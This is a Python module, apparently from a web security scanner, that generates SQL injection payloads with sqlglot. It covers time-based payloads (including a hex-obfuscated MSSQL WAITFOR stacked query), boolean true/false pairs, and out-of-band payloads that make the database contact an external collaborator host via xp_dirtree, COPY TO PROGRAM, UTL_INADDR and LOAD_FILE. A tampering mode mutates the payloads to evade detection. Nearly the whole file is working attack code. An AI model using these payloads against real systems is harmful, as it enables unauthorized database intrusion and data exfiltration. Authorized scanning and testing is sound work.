# -*- coding: utf-8 -*-
"""
AST-based SQLi Payload Generator using sqlglot.

This module is responsible for creating dialect-aware, syntactically
correct SQL injection payloads by manipulating Abstract Syntax Trees (AST).
"""

import sqlglot
from sqlglot import exp
import random

# --- AdvSQLi Transformer Functions ---

def swap_case(s: str) -> str:
    """Randomly swaps the case of letters in a string."""
    return "".join(c.upper() if random.random() > 0.5 else c.lower() for c in s)

def transform_identifier_case(node: exp.Expression) -> exp.Expression:
    """Transforms the case of identifiers (e.g., function names, columns)."""
    if isinstance(node, exp.Identifier):
        node.set('this', swap_case(node.this))
    return node

def transform_operator_swap(node: exp.Expression) -> exp.Expression:
    """Swaps logical operators (e.g., EQ to LIKE)."""
    if isinstance(node, exp.EQ):
        return exp.Like(this=node.this, expression=node.expression)
    return node

# The TRANSFORMERS dictionary maps sqlglot expression types to a list of
# applicable transformation functions. This allows for targeted mutations.
TRANSFORMERS = {
    exp.Identifier: [transform_identifier_case],
    exp.EQ: [transform_operator_swap],
}

class AstPayloadGenerator:
    """
    Generates dialect-aware SQLi payloads using AST manipulation.
    This allows for more flexible and harder-to-detect payloads compared
    to static string-based lists.
    """

    def __init__(self, dialect: str = "mysql"):
        self.dialect = dialect.lower() if dialect else "mysql"

    def _generate_time_based(self, sleep_time: int, context: str, tamper: bool = False) -> list[tuple[str, str]]:
        """Generates time-based payloads."""
        payloads = []

        # --- MSSQL Special Handling for WAITFOR (Stacked Query with Obfuscation) ---
        if self.dialect == "mssql":
            delay_str = f"0:0:{sleep_time}"
            hex_encoded_payload = "0x57414954464F522044454C41592027" + delay_str.encode().hex() + "27"
            payload_fragment = f";DECLARE @S VARCHAR(4000);SET @S=CAST({hex_encoded_payload} AS VARCHAR(4000));EXEC(@S);--"
            sql = self._contextualize_string_payload(payload_fragment, context)
            payloads.append((sql, "MSSQL_WAITFOR_OBFUSCATED"))
            return payloads

        # Base sleep functions per dialect
        if self.dialect == "postgresql":
            sleep_func = exp.Anonymous(this="pg_sleep", params=[sleep_time])
        elif self.dialect == "sqlite":
            blob_size = max(500000, int(sleep_time * 500000))
            heavy_query = f"(SELECT 1 WHERE LENGTH(HEX(RANDOMBLOB({blob_size}))) > 0)"
            sleep_func = sqlglot.parse_one(f"{heavy_query} IS NOT NULL")
        else: # Default to MySQL's SLEEP
            sleep_func = exp.Anonymous(this="SLEEP", params=[exp.Literal.number(sleep_time)])

        # Variations
        for logic_op in [exp.And, exp.Or]:
            condition = logic_op(this=exp.Boolean(this=True), expression=sleep_func.copy())
            if tamper:
                condition = self._apply_ast_transformations(condition)
            sql = self._build_sql(condition, context)
            payloads.append((sql, f"{self.dialect.upper()}_SLEEP"))

        if self.dialect == "mysql":
            benchmark_expr = exp.Anonymous(
                this="BENCHMARK",
                params=[exp.Literal.number(sleep_time * 1000000), exp.Anonymous(this="MD5", params=[exp.Literal.string("1")])]
            )
            for logic_op in [exp.And, exp.Or]:
                condition = logic_op(left=exp.Boolean(this=True), right=benchmark_expr.copy())
                sql = self._build_sql(condition, context)
                payloads.append((sql, f"MYSQL_BENCHMARK"))

        return payloads

    def _apply_ast_transformations(self, expression: exp.Expression) -> exp.Expression:
        """
        Applies a random selection of transformations to the AST nodes.
        """
        # The correct way to walk the tree and replace nodes is to use sqlglot.transform
        def transform_func(node):
            node_type = type(node)
            if node_type in TRANSFORMERS:
                if random.random() < 0.7:
                    transformer = random.choice(TRANSFORMERS[node_type])
                    new_node = transformer(node.copy())
                    return new_node
            return node

        return expression.transform(transform_func)

    def _generate_boolean_based(self, context: str, tamper: bool = False) -> list[tuple[str, str, str]]:
        """Generates boolean-based payloads (true/false pairs) using direct AST construction."""
        pairs = []
        conditions = [
            (exp.EQ(this=exp.Literal.number(1), to=exp.Literal.number(1)), exp.EQ(this=exp.Literal.number(1), to=exp.Literal.number(2))),
            (exp.Like(this=exp.Literal.string("a"), to=exp.Literal.string("a")), exp.Like(this=exp.Literal.string("a"), to=exp.Literal.string("b"))),
        ]

        for true_cond, false_cond in conditions:
            if tamper:
                true_cond = self._apply_ast_transformations(true_cond)
                false_cond = self._apply_ast_transformations(false_cond)

            for logic_op in [exp.And, exp.Or]:
                # Use the correct keyword arguments: `this` for left, `expression` for right
                true_expr = logic_op(this=exp.Boolean(this=True), expression=true_cond.copy())
                false_expr = logic_op(this=exp.Boolean(this=True), expression=false_cond.copy())

                true_sql = self._build_sql(true_expr, context)
                false_sql = self._build_sql(false_expr, context)
                pairs.append((true_sql, false_sql, f"LOGICAL_{logic_op.__name__.upper()}"))
        return pairs

    def _generate_oob(self, collaborator_url: str, context: str) -> list[tuple[str, str]]:
        """Generates out-of-band (OOB) payloads."""
        payloads = []
        if "://" in collaborator_url:
            collaborator_url = collaborator_url.split("://")[1]

        oob_payload_str, family = "", ""
        if self.dialect == "mssql":
            oob_payload_str = f";EXEC master..xp_dirtree '\\\\{collaborator_url}\\a'"
            family = "MSSQL_XP_DIRTREE"
        elif self.dialect == "postgresql":
            oob_payload_str = f";COPY (SELECT '') TO PROGRAM 'nslookup {collaborator_url}'"
            family = "POSTGRES_COPY_PROGRAM"
        elif self.dialect == "oracle":
            oob_payload_str = f" AND UTL_INADDR.GET_HOST_ADDRESS('{collaborator_url}') IS NOT NULL"
            family = "ORACLE_UTL_INADDR"
        elif self.dialect == "mysql":
            oob_payload_str = f" AND LOAD_FILE('\\\\{collaborator_url}\\a')"
            family = "MYSQL_LOAD_FILE"

        if oob_payload_str:
            sql = self._contextualize_string_payload(oob_payload_str, context)
            payloads.append((sql, family))
        return payloads

    def _contextualize_string_payload(self, payload: str, context: str) -> str:
        """Adds context-specific prefixes/suffixes to a raw string payload."""
        if context in ["HTML_ATTRIBUTE_SINGLE_QUOTED", "JS_STRING_SINGLE_QUOTED", "HTML_ATTRIBUTE"]:
            sql = "'" + payload + "-- "
        elif context in ["HTML_ATTRIBUTE_DOUBLE_QUOTED", "JS_STRING_DOUBLE_QUOTED"]:
            sql = '"' + payload + "-- "
        else:
            if payload.strip().startswith(';'):
                sql = "'" + payload + "-- "
            else:
                sql = payload + "-- "
        return sql

    def _build_sql(self, expression: exp.Expression, context: str) -> str:
        """Serializes the expression to SQL and adds context prefixes/suffixes."""
        sql_str = " " + expression.sql(dialect=self.dialect)
        return self._contextualize_string_payload(sql_str, context)

    def generate(self, payload_type: str, context: str, options: dict = None, tamper: bool = False) -> list:
        """
        Generates a list of SQLi payloads.

        Args:
            payload_type (str): The type of payload to generate (e.g., "TIME_BASED").
            context (str): The injection context (e.g., "HTML_ATTRIBUTE_SINGLE_QUOTED").
            options (dict, optional): A dictionary of options for the payload type.
            tamper (bool, optional): If True, applies AdvSQLi transformations. Defaults to False.

        Returns:
            list: A list of generated payloads.
        """
        options = options or {}
        if payload_type == "TIME_BASED":
            return self._generate_time_based(options.get("sleep_time", 5), context, tamper=tamper)
        elif payload_type == "BOOLEAN_BASED":
            return self._generate_boolean_based(context, tamper=tamper)
        elif payload_type == "OOB":
            collaborator_url = options.get("collaborator_url")
            return self._generate_oob(collaborator_url, context) if collaborator_url else []
        return []

if __name__ == '__main__':
    # Example usage for testing
    mysql_gen = AstPayloadGenerator(dialect='mysql')

    print("--- MySQL Boolean-Based (Standard) ---")
    payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED")
    for t, f, fam in payloads[:1]: # Show one example
        print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")

    print("\n--- MySQL Boolean-Based (With AdvSQLi Tampering) ---")
    tampered_payloads = mysql_gen.generate("BOOLEAN_BASED", context="HTML_ATTRIBUTE_SINGLE_QUOTED", tamper=True)
    for t, f, fam in tampered_payloads[:1]: # Show one example
        print(f"  Family: {fam}\n    TRUE: {t}\n    FALSE: {f}")
